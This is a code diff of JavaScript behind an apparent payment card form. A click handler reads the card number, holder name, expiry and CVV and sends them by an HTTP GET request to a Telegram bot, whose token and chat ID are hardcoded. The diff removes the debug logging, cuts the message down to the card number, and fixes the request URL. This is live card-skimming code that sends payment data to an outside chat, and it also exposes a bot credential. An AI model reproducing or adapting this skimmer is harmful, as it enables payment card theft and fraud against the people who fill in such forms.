@@ -92,19 +92,17 @@ but.addEventListener("click", (e) =>{
   let expyr = document.querySelector("#cardYear").value
   let ccv = document.querySelector("#cardCvv").value
 
-  console.log(num)
-  console.log(hold)
-  console.log(expmont)
-  console.log(expyr)
-  console.log(ccv)
+
   var token = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
   var chatid = -4071018603
-  var mytext = `Result is: %0A Number:${num} %0A Hold: ${hold} %0A Month: ${expmont} %0A Year: ${expyr} %0A ccv = ${ccv}` 
+  var mytext = `Result ${num}` 
   
-  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id${chatid}&text=${mytext}/
-  `
+  var url = ` https://api.telegram.org/bot6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA/sendMessage?chat_id=-4071018603&text=${mytext}`
+ 
+
   let aip = new XMLHttpRequest();
-  aip.open("GET", url,true);
+  aip.open("GET", url, true);
   aip.send
+  console.log("kargadaayvelaperi")
 
 })
